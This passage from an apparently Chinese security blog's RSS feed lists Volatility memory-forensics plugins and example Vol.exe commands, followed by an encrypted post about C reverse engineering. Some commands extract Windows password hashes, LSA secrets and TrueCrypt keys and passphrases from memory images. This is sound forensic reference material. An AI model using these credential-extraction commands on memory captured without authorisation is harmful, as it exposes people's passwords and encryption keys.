&lt;td&gt;转储内存中的Windows帐户密码哈希(LM&amp;#x2F;NTLM)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hibinfo&lt;/td&gt;
&lt;td&gt;转储休眠文件信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hivedump&lt;/td&gt;
&lt;td&gt;打印注册表配置单元信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hivelist&lt;/td&gt;
&lt;td&gt;打印注册表配置单元列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hivescan&lt;/td&gt;
&lt;td&gt;注册表配置单元池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hpakextract&lt;/td&gt;
&lt;td&gt;从HPAK文件（Fast Dump格式）提取物理内存数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;hpakinfo&lt;/td&gt;
&lt;td&gt;查看HPAK文件属性及相关信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;idt&lt;/td&gt;
&lt;td&gt;显示中断描述符表(Interrupt Deor Table)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;iehistory&lt;/td&gt;
&lt;td&gt;重建IE缓存及访问历史记录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;imagecopy&lt;/td&gt;
&lt;td&gt;将物理地址空间导出原生DD镜像文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;imageinfo&lt;/td&gt;
&lt;td&gt;查看&amp;#x2F;识别镜像信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;impscan&lt;/td&gt;
&lt;td&gt;扫描对导入函数的调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;joblinks&lt;/td&gt;
&lt;td&gt;打印进程任务链接信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;kdbgscan&lt;/td&gt;
&lt;td&gt;搜索和转储潜在KDBG值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;kpcrscan&lt;/td&gt;
&lt;td&gt;搜索和转储潜在KPCR值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ldrmodules&lt;/td&gt;
&lt;td&gt;检测未链接的动态链接DLL&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lsadump&lt;/td&gt;
&lt;td&gt;从注册表中提取LSA密钥信息（已解密）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;machoinfo&lt;/td&gt;
&lt;td&gt;转储Mach-O 文件格式信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;malfind&lt;/td&gt;
&lt;td&gt;查找隐藏的和插入的代码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mbrparser&lt;/td&gt;
&lt;td&gt;扫描并解析潜在的主引导记录(MBR)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;memdump&lt;/td&gt;
&lt;td&gt;转储进程的可寻址内存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;memmap&lt;/td&gt;
&lt;td&gt;打印内存映射&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;messagehooks&lt;/td&gt;
&lt;td&gt;桌面和窗口消息钩子的线程列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mftparser&lt;/td&gt;
&lt;td&gt;扫描并解析潜在的MFT条目&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;moddump&lt;/td&gt;
&lt;td&gt;转储内核驱动程序到可执行文件的示例&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;modscan&lt;/td&gt;
&lt;td&gt;内核模块池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;modules&lt;/td&gt;
&lt;td&gt;打印加载模块的列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;multiscan&lt;/td&gt;
&lt;td&gt;批量扫描各种对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;mutantscan&lt;/td&gt;
&lt;td&gt;对互斥对象池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;notepad&lt;/td&gt;
&lt;td&gt;查看记事本当前显示的文本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;objtypescan&lt;/td&gt;
&lt;td&gt;扫描窗口对象类型对象&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;patcher&lt;/td&gt;
&lt;td&gt;基于页面扫描的补丁程序内存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;poolpeek&lt;/td&gt;
&lt;td&gt;可配置的池扫描器插件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;printkey&lt;/td&gt;
&lt;td&gt;打印注册表项及其子项和值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;privs&lt;/td&gt;
&lt;td&gt;显示进程权限&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;procdump&lt;/td&gt;
&lt;td&gt;进程转储到一个可执行文件示例&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;pslist&lt;/td&gt;
&lt;td&gt;按照EPROCESS列表打印所有正在运行的进程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;psscan&lt;/td&gt;
&lt;td&gt;进程对象池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;pstree&lt;/td&gt;
&lt;td&gt;以树型方式打印进程列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;psxview&lt;/td&gt;
&lt;td&gt;查找带有隐藏进程的所有进程列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;qemuinfo&lt;/td&gt;
&lt;td&gt;转储Qemu 信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;raw2dmp&lt;/td&gt;
&lt;td&gt;将物理内存原生数据转换为windbg崩溃转储格式&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;screenshot&lt;/td&gt;
&lt;td&gt;基于GDI Windows的虚拟屏幕截图保存&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;servicediff&lt;/td&gt;
&lt;td&gt;Windows服务列表(ala Plugx)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sessions&lt;/td&gt;
&lt;td&gt;_MM_SESSION_SPACE的详细信息列表(用户登录会话)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;shellbags&lt;/td&gt;
&lt;td&gt;打印Shellbags信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;shimcache&lt;/td&gt;
&lt;td&gt;解析应用程序兼容性Shim缓存注册表项&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;shutdowntime&lt;/td&gt;
&lt;td&gt;从内存中的注册表信息获取机器关机时间&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sockets&lt;/td&gt;
&lt;td&gt;打印已打开套接字列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sockscan&lt;/td&gt;
&lt;td&gt;TCP套接字对象池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ssdt&lt;/td&gt;
&lt;td&gt;显示SSDT条目&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;strings&lt;/td&gt;
&lt;td&gt;物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;svcscan&lt;/td&gt;
&lt;td&gt;Windows服务列表扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;symlinkscan&lt;/td&gt;
&lt;td&gt;符号链接对象池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;thrdscan&lt;/td&gt;
&lt;td&gt;线程对象池扫描&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;threads&lt;/td&gt;
&lt;td&gt;调查_ETHREAD 和_KTHREADs&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;timeliner&lt;/td&gt;
&lt;td&gt;创建内存中的各种痕迹信息的时间线&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;timers&lt;/td&gt;
&lt;td&gt;打印内核计时器及关联模块的DPC&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;truecryptmaster&lt;/td&gt;
&lt;td&gt;恢复TrueCrypt 7.1a主密钥&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;truecryptpassphrase&lt;/td&gt;
&lt;td&gt;查找并提取TrueCrypt密码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;truecryptsummary&lt;/td&gt;
&lt;td&gt;TrueCrypt摘要信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;unloadedmodules&lt;/td&gt;
&lt;td&gt;打印卸载的模块信息列表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;userassist&lt;/td&gt;
&lt;td&gt;打印注册表中UserAssist相关信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;userhandles&lt;/td&gt;
&lt;td&gt;转储用户句柄表&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vaddump&lt;/td&gt;
&lt;td&gt;转储VAD数据为文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vadinfo&lt;/td&gt;
&lt;td&gt;转储VAD信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vadtree&lt;/td&gt;
&lt;td&gt;以树形方式显示VAD树信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vadwalk&lt;/td&gt;
&lt;td&gt;显示遍历VAD树&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vboxinfo&lt;/td&gt;
&lt;td&gt;转储Virtualbox信息（虚拟机）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;verinfo&lt;/td&gt;
&lt;td&gt;打印PE镜像中的版本信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;vmwareinfo&lt;/td&gt;
&lt;td&gt;转储VMware VMSS&amp;#x2F;VMSN 信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;volshell&lt;/td&gt;
&lt;td&gt;内存镜像中的shell&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;windows&lt;/td&gt;
&lt;td&gt;打印桌面窗口(详细信息)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;wintree&lt;/td&gt;
&lt;td&gt;Z顺序打印桌面窗口树&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;wndscan&lt;/td&gt;
&lt;td&gt;池扫描窗口站&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;yarascan&lt;/td&gt;
&lt;td&gt;以Yara签名扫描进程或内核内存&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id&gt;&lt;a href=&#34;#&#34; class=&#34;headerlink&#34; title&gt;&lt;/a&gt;&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;strong&gt;功能&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;命令行及参数&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;查看进程列表&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 pslist&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看进程列表（树形）&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 pstree&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看进程列表(psx视图)&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 psxview&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看网络通讯连接&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 netscan&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看加载的动态链接库&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 dlllist&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看SSDT表&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 ssdt&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看UserAssist痕迹&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 userassist&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看ShimCache痕迹&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 shimcache&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看ShellBags&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 shellbags&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看服务列表&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 svcscan&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看Windows帐户hash&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 hashdump&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看最后关机时间&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 shutdowntime&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查看IE历史记录&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 iehistory&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;提取注册表数据&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 dumpregistry&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;解析MFT记录&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 mftparser&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;导出MFT记录,恢复文件&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 mftparser –output-file&amp;#x3D;mftverbose.txt -D mftoutput&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;获取TrueCrypt密钥信息&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 truecryptmaster&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;获取TrueCrypt密码信息&lt;/td&gt;
&lt;td&gt;Vol.exe -f Win7_SP1_x86.vmem –profile&amp;#x3D;Win7SP1x86 truecryptpassphras&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/03/18/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/</guid>
            <title>滴水逆向—C语言笔记</title>
            <link>https://w-sqrt7.github.io/2024/03/18/dishui-note/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91%E2%80%94C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/</link>
            <category>原创</category>
            <category>逆向</category>
            <category>C语言</category>
            <pubDate>Mon, 18 Mar 2024 15:07:46 +0800</pubDate>
            <description><![CDATA[ &lt;div class=&#34;hbe hbe-container&#34; id=&#34;hexo-blog-encrypt&#34; data-wpm=&#34;抱歉, 这个密码看着不太对, 请再试试.&#34; data-whm=&#34;抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.&#34;&gt;
  &lt;script id=&#34;hbeData&#34; type=&#34;hbeData&#34; data-hmacdigest=&#34;2a15ba59c4896afc5fa4ddbe32a240d5219ebe4179445230efa2eb28419be4cb&#34;&gt;e05d9ee6e48268b2b742c6d6f1681d6164fa5aa1dc52a0c978370e90ed17c302a63a466df9fb22fcb8ce418c71d391ef7045c9a0362206f2cec6024735d3437bddffa4cd87005b935983f7fc71381175608b9e2e92623ea511ca2c0267e1b7e53d8f7241da9b1f3a7cf840fbf0cf1e2fd74440faf85e9f652188ffaee1fef998428181ca374288c30a02dcb276a717806121e68d2f03adea7e4664eaaefd0577ff0780518d39e0e33ef7cf272493dac76470d90ff969cf8eb440fc6a01e4b71a3f40c5dd3d70bacd39e396c0d3127ee1&lt;/script&gt;
  &lt;div class=&#34;hbe hbe-content&#34;&gt;
    &lt;div class=&#34;hbe hbe-input hbe-input-default&#34;&gt;
      &lt;input class=&#34;hbe hbe-input-field hbe-input-field-default&#34; type=&#34;password&#34; id=&#34;hbePass&#34;&gt;
      &lt;label class=&#34;hbe hbe-input-label hbe-input-label-default&#34; for=&#34;hbePass&#34;&gt;
        &lt;span class=&#34;hbe hbe-input-label-content hbe-input-label-content-default&#34;&gt;您好, 这里需要密码.&lt;/span&gt;
      &lt;/label&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&#34;/lib/hbe.js&#34;&gt;&lt;/script&gt;&lt;link href=&#34;/css/hbe.style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt; ]]></description>
        </item>
    </channel>
</rss>
